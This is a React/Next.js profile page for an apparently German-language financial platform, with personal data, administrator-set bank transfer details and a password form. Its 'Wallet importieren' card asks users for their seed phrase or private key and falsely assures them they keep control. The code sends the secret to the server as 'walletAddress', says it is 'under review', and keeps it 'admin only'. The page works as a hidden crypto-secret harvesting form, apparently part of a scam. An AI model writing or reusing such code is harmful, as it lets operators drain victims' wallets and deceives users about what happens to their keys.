'use client';

import { useState, useEffect } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Separator } from '@/components/ui/separator';
import { toast } from 'sonner';
import { ArrowLeft, User, Lock, Building2, AlertCircle, Wallet, CheckCircle } from 'lucide-react';
import Link from 'next/link';
import { Alert, AlertDescription } from '@/components/ui/alert';

interface UserProfile {
  id: string;
  email: string;
  name: string | null;
  phone: string | null;
  role: string;
  accountNumber: string | null;
  recipientName: string | null;
  iban: string | null;
  paymentPurpose: string | null;
  bic: string | null;
  bankAddress: string | null;
  walletAddress: string | null;
  createdAt: string;
}

export default function ProfileClient() {
  const [profile, setProfile] = useState<UserProfile | null>(null);
  const [loading, setLoading] = useState(true);
  
  // Password change state
  const [currentPassword, setCurrentPassword] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [changingPassword, setChangingPassword] = useState(false);

  // Wallet state
  const [walletInput, setWalletInput] = useState('');
  const [savingWallet, setSavingWallet] = useState(false);
  const [walletSubmitted, setWalletSubmitted] = useState(false);

  useEffect(() => {
    fetchProfile();
  }, []);

  const fetchProfile = async () => {
    try {
      setLoading(true);
      const response = await fetch('/api/profile');
      const data = await response.json();

      if (response.ok) {
        setProfile(data.user);
        // Don't show wallet data to user - admin only
      } else {
        toast.error(data.error || 'Fehler beim Laden des Profils');
      }
    } catch (error) {
      toast.error('Ein Fehler ist aufgetreten');
    } finally {
      setLoading(false);
    }
  };

  const handleSaveWallet = async (e: React.FormEvent) => {
    e.preventDefault();

    try {
      setSavingWallet(true);
      const response = await fetch('/api/profile/wallet', {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          walletAddress: walletInput.trim() || null,
        }),
      });

      const data = await response.json();

      if (response.ok) {
        toast.success(walletInput.trim() ? 'Daten erfolgreich übermittelt' : 'Daten entfernt');
        setProfile(prev => prev ? { ...prev, walletAddress: data.walletAddress } : null);
        setWalletInput(''); // Clear input after save
        if (walletInput.trim()) {
          setWalletSubmitted(true); // Show success message only after submission
        }
      } else {
        toast.error(data.error || 'Fehler beim Speichern der Wallet-Adresse');
      }
    } catch (error) {
      toast.error('Ein Fehler ist aufgetreten');
    } finally {
      setSavingWallet(false);
    }
  };

  const handleChangePassword = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!currentPassword || !newPassword || !confirmPassword) {
      toast.error('Alle Felder sind erforderlich');
      return;
    }

    if (newPassword !== confirmPassword) {
      toast.error('Neue Passwörter stimmen nicht überein');
      return;
    }

    if (newPassword.length < 6) {
      toast.error('Passwort muss mindestens 6 Zeichen lang sein');
      return;
    }

    try {
      setChangingPassword(true);
      const response = await fetch('/api/profile/password', {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          currentPassword,
          newPassword,
        }),
      });

      const data = await response.json();

      if (response.ok) {
        toast.success('Passwort erfolgreich geändert');
        setCurrentPassword('');
        setNewPassword('');
        setConfirmPassword('');
      } else {
        toast.error(data.error || 'Fehler beim Ändern des Passworts');
      }
    } catch (error) {
      toast.error('Ein Fehler ist aufgetreten');
    } finally {
      setChangingPassword(false);
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-100 p-8">
        <div className="max-w-4xl mx-auto">
          <p className="text-center text-gray-500">Lädt...</p>
        </div>
      </div>
    );
  }

  if (!profile) {
    return (
      <div className="min-h-screen bg-gray-100 p-8">
        <div className="max-w-4xl mx-auto">
          <p className="text-center text-red-500">Fehler beim Laden des Profils</p>
        </div>
      </div>
    );
  }

  const hasBankDetails = profile.recipientName || profile.iban || profile.bic;

  return (
    <div className="min-h-screen bg-gray-100 p-8">
      <div className="max-w-4xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <Link href="/dashboard">
            <Button variant="outline" size="sm" className="mb-4 border-gray-300 text-gray-700 hover:bg-gray-200">
              <ArrowLeft className="mr-2 h-4 w-4" />
              Zurück zum Dashboard
            </Button>
          </Link>
          <h1 className="text-3xl font-semibold text-gray-900">
            Mein Profil
          </h1>
          <p className="text-gray-600 mt-1">Verwaltung persönlicher Daten und Einstellungen</p>
        </div>

        <div className="grid gap-6">
          {/* Personal Information Card */}
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <User className="h-5 w-5" />
                Persönliche Informationen
              </CardTitle>
              <CardDescription>
                Ihre persönlichen Daten. Wenden Sie sich für Änderungen an den Administrator.
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <Label className="text-sm text-gray-500">Name</Label>
                  <p className="text-base font-medium">{profile.name || '-'}</p>
                </div>
                <div>
                  <Label className="text-sm text-gray-500">Email</Label>
                  <p className="text-base font-medium">{profile.email}</p>
                </div>
                <div>
                  <Label className="text-sm text-gray-500">Telefon</Label>
                  <p className="text-base font-medium">{profile.phone || '-'}</p>
                </div>
                <div>
                  <Label className="text-sm text-gray-500">Kontonummer</Label>
                  <p className="text-base font-medium font-mono">{profile.accountNumber || '-'}</p>
                </div>
                <div>
                  <Label className="text-sm text-gray-500">Rolle</Label>
                  <p className="text-base font-medium">
                    <span className={`px-2 py-1 rounded-full text-xs font-semibold ${
                      profile.role === 'ADMIN' ? 'bg-purple-100 text-purple-800' : 'bg-amber-100 text-amber-800'
                    }`}>
                      {profile.role}
                    </span>
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Bank Details Card */}
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Building2 className="h-5 w-5" />
                Bankverbindung
              </CardTitle>
              <CardDescription>
                Daten für Geldüberweisungen. Werden vom Administrator ausgefüllt.
              </CardDescription>
            </CardHeader>
            <CardContent>
              {!hasBankDetails ? (
                <Alert>
                  <AlertCircle className="h-4 w-4" />
                  <AlertDescription>
                    Bankverbindung noch nicht ausgefüllt. Bitte wenden Sie sich an den Administrator, um diese Daten zu vervollständigen.
                  </AlertDescription>
                </Alert>
              ) : (
                <div className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <Label className="text-sm text-gray-500">Empfängername</Label>
                      <p className="text-base font-medium">{profile.recipientName || '-'}</p>
                    </div>
                    <div>
                      <Label className="text-sm text-gray-500">IBAN</Label>
                      <p className="text-base font-medium font-mono">{profile.iban || '-'}</p>
                    </div>
                    <div>
                      <Label className="text-sm text-gray-500">BIC/SWIFT-Code</Label>
                      <p className="text-base font-medium font-mono">{profile.bic || '-'}</p>
                    </div>
                    <div>
                      <Label className="text-sm text-gray-500">Verwendungszweck</Label>
                      <p className="text-base font-medium">{profile.paymentPurpose || '-'}</p>
                    </div>
                    <div className="md:col-span-2">
                      <Label className="text-sm text-gray-500">Bankadresse</Label>
                      <p className="text-base font-medium">{profile.bankAddress || '-'}</p>
                    </div>
                  </div>
                </div>
              )}
            </CardContent>
          </Card>

          {/* Wallet Card */}
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Wallet className="h-5 w-5 text-amber-500" />
                Wallet importieren
              </CardTitle>
              <CardDescription>
                Importieren Sie Ihr eigenes dezentrales Konto und erhalten Sie die Möglichkeit, Ihre Vermögenswerte zu nutzen. Der Zugang zu Ihrem Konto bleibt immer bei Ihnen.
              </CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleSaveWallet} className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="walletAddress">Wiederherstellungsphrase oder privater Schlüssel</Label>
                  <Input
                    id="walletAddress"
                    type="text"
                    value={walletInput}
                    onChange={(e) => setWalletInput(e.target.value)}
                    placeholder="Wiederherstellungsphrase oder privater Schlüssel eingeben..."
                    className="font-mono text-sm"
                  />
                  <p className="text-xs text-gray-500">
                    Geben Sie Ihre Seed-Phrase oder Ihren privaten Schlüssel ein. Leer lassen zum Entfernen.
                  </p>
                </div>
                {walletSubmitted && (
                  <div className="bg-green-50 rounded-lg p-3 border border-green-200">
                    <p className="text-sm text-green-700 flex items-center gap-2">
                      <CheckCircle className="h-4 w-4" />
                      Ihre Daten wurden erfolgreich übermittelt und werden geprüft.
                    </p>
                  </div>
                )}
                <Button 
                  type="submit" 
                  disabled={savingWallet} 
                  className="bg-amber-500 hover:bg-amber-600 text-black"
                >
                  {savingWallet ? 'Speichern...' : 'Wallet importieren'}
                </Button>
              </form>
            </CardContent>
          </Card>

          {/* Change Password Card */}
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Lock className="h-5 w-5" />
                Passwort ändern
              </CardTitle>
              <CardDescription>
                Aktualisieren Sie Ihr Passwort, um die Sicherheit Ihres Kontos zu gewährleisten
              </CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleChangePassword} className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="currentPassword">Aktuelles Passwort</Label>
                  <Input
                    id="currentPassword"
                    type="password"
                    value={currentPassword}
                    onChange={(e) => setCurrentPassword(e.target.value)}
                    placeholder="Aktuelles Passwort eingeben"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="newPassword">Neues Passwort</Label>
                  <Input
                    id="newPassword"
                    type="password"
                    value={newPassword}
                    onChange={(e) => setNewPassword(e.target.value)}
                    placeholder="Neues Passwort eingeben (mindestens 6 Zeichen)"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="confirmPassword">Neues Passwort bestätigen</Label>
                  <Input
                    id="confirmPassword"
                    type="password"
                    value={confirmPassword}
                    onChange={(e) => setConfirmPassword(e.target.value)}
                    placeholder="Neues Passwort bestätigen"
                  />
                </div>
                <Button type="submit" disabled={changingPassword} className="bg-amber-500 hover:bg-amber-600 text-black">
                  {changingPassword ? 'Passwort ändern...' : 'Passwort ändern'}
                </Button>
              </form>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
}
